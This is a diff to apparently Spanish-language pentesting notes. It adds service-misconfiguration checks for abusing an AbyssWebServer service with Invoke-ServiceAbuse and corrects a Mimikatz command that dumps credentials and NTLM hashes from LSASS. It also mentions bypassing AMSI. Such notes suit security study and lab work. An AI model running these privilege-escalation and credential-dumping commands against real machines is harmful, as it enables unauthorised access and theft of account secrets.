@@ -66,6 +66,8 @@ NOTA: Siempre hacer un Bypass AMSI
 # Servicios clave para escalar 
 1 AbyssWebServer con Check: 'Unquoted service paths' 
 2 AbyssWebServer con Check: 'Modifiable Service Files' y CanRestart: 'True'
+3 StartName: LocalSystem 
+4 ModifiableFileIdentityReference: Everyone 
 
 ---  Hacer el abuso  ---
 ❯ Invoke-ServiceAbuse -Name AbyssWebServer -Username 'dominio\usuario'
@@ -82,7 +84,7 @@ NOTA: Requiere cerrar sesión y volver a autenticarse para que sean asignados lo
 # Mimikatz 
 ❯ .\mimikatz.exe        # Forma separada 
 	privilege::debug 
-	sekrlsa::logonpasswords 
+	sekurlsa::logonpasswords 
 
 ❯ .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit      # El mismo comando en una sola línea 
 # Habilitar SeDebugPrivilege y extraer credenciales/hashes NTLM de sesiones activas en LSASS
